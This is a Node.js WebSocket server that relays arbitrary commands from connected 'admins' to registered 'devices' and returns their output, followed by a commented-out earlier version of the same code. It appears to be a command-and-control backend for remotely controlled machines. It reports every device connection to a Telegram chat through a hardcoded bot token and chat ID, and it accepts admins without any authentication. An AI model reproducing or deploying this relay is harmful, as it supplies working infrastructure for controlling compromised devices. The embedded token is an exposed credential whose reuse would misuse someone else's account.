const WebSocket = require("ws");
const TelegramBot = require("node-telegram-bot-api");

// lll
const TELEGRAM_TOKEN = "7312714201:AAHB1qksZPR0GoTBXW-XKBx7jwyh_FAc1S8";
const CHAT_ID = "6051143430";

const bot = new TelegramBot(TELEGRAM_TOKEN, { polling: false });

const wss = new WebSocket.Server({ port: 8000 });

let devices = {};
let admins = [];

wss.on("connection", (ws) => {
  ws.on("message", (msg) => {
    try {
      const data = JSON.parse(msg.toString());

      // Device register
      if (data.type === "register_device") {
        const id = data.id;
        devices[id] = ws;
        ws.deviceId = id;
        console.log("Device connected:", id);

        // 📢 Telegram notification
        bot.sendMessage(CHAT_ID, `📡 New device connected:\n🆔 ID: ${id}`);

        notifyAdmins();
      }

      // Admin register
      else if (data.type === "register_admin") {
        admins.push(ws);
        ws.isAdmin = true;
        console.log("Admin connected");
        ws.send(JSON.stringify({ type: "device_list", devices: Object.keys(devices) }));
      }

      // Admin command -> forward to device
      else if (data.type === "command") {
        const device = devices[data.id];
        if (device) {
          device.send(JSON.stringify({ type: "command", command: data.command }));
        }
      }

      // Device output -> forward to all admins
      else if (data.type === "device_output") {
        admins.forEach((admin) => {
          if (admin.readyState === WebSocket.OPEN) {
            admin.send(JSON.stringify({
              type: "device_output",
              id: data.id,
              output: data.output
            }));
          }
        });
      }
    } catch (e) {
      console.log("Error:", e.message);
    }
  });

  ws.on("close", () => {
    if (ws.deviceId && devices[ws.deviceId]) {
      console.log("Device disconnected:", ws.deviceId);

      // 📢 Telegram notify disconnection
      bot.sendMessage(CHAT_ID, `❌ Device disconnected:\n🆔 ID: ${ws.deviceId}`);

      delete devices[ws.deviceId];
      notifyAdmins();
    }
    if (ws.isAdmin) {
      admins = admins.filter((a) => a !== ws);
      console.log("Admin disconnected");
    }
  });
});

function notifyAdmins() {
  admins.forEach((admin) => {
    if (admin.readyState === WebSocket.OPEN) {
      admin.send(JSON.stringify({
        type: "device_list",
        devices: Object.keys(devices)
      }));
    }
  });
}

console.log("Server started on port 8000");

/*const WebSocket = require("ws");

const wss = new WebSocket.Server({ port: process.env.PORT || 8000 });

let devices = {};
let admins = [];

wss.on("connection", (ws) => {
  ws.on("message", (msg) => {
    const data = JSON.parse(msg.toString());

    // Device connected
    if (data.type === "register_device") {
      devices[data.id] = ws;
      console.log(`Device connected: ${data.id}`);
      broadcastAdmins();
    }

    // Admin connected
    if (data.type === "register_admin") {
      admins.push(ws);
      console.log("Admin connected");
      ws.send(JSON.stringify({ type: "device_list", devices: Object.keys(devices) }));
    }

    // Admin sent command → forward to device
    if (data.type === "command" && devices[data.id]) {
      devices[data.id].send(JSON.stringify({ type: "command", command: data.command }));
    }

    // Device sent output → forward to admin
    if (data.type === "output") {
      admins.forEach((admin) => {
        admin.send(JSON.stringify({ type: "device_output", id: data.id, output: data.output }));
      });
    }
  });

  ws.on("close", () => {
    // remove closed device or admin
    Object.keys(devices).forEach((id) => {
      if (devices[id] === ws) {
        delete devices[id];
        console.log(`Device disconnected: ${id}`);
      }
    });
    admins = admins.filter((a) => a !== ws);
    broadcastAdmins();
  });
});

function broadcastAdmins() {
  admins.forEach((admin) => {
    admin.send(JSON.stringify({ type: "device_list", devices: Object.keys(devices) }));
  });
}

console.log("Server started on port", process.env.PORT || 8000);*/
